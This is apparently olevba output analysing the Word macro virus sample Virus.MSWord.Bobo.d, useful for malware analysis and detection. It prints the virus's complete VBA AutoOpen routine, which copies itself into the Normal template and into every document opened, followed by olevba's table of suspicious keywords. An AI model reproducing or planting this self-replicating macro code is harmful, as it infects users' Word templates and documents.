olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bobo.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bobo.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO macronew.bas 
in file: Virus.MSWord.Bobo.d - OLE stream: 'Macros/VBA/macronew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
bo = False
For Each sty In NormalTemplate.VBProject.VBComponents
    If sty.Name = "macronew" Then
       bo = True
    End If
Next sty
 If bo = False Then
   m = ActiveDocument.Path
   r = m + "\" + ActiveDocument.Name
   Application.OrganizerCopy Source:=r, _
   Destination:=NormalTemplate, Name:="macronew", _
   Object:=wdOrganizerObjectProjectItems
   NormalTemplate.Save
   If Err.Number <> 0 Then
     Exit Sub
   End If
 End If
 bo = False
For Each sty In ActiveDocument.VBProject.VBComponents
    If sty.Name = "macronew" Then
       bo = True
    End If
Next sty
 If bo = False Then
   m = ActiveDocument.Path
   r = m + "\" + ActiveDocument.Name
   Application.OrganizerCopy Source:=NormalTemplate, _
   Destination:=r, Name:="macronew", _
   Object:=wdOrganizerObjectProjectItems
   ActiveDocument.SaveAs r
   If Err.Number <> 0 Then
     Exit Sub
   End If
 End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

